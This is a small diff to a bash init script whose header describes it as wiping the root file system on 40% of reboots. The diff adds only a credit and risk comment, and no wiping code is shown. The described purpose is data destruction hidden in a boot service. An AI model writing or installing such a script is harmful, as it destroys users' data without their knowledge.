@@ -1,6 +1,7 @@
 #!/bin/bash
 # chkconfig: 125 20 80
 # description: Every reboot will have a 40% success rate of wiping the root file system. Why 40%? Why not 100%? Because I'm not a evil person.
+# Credit to matrix5009 for contributions to this script. USE THIS CODE AT YOUR OWN RISK.
 
 # Source function library.
 . /etc/init.d/functions
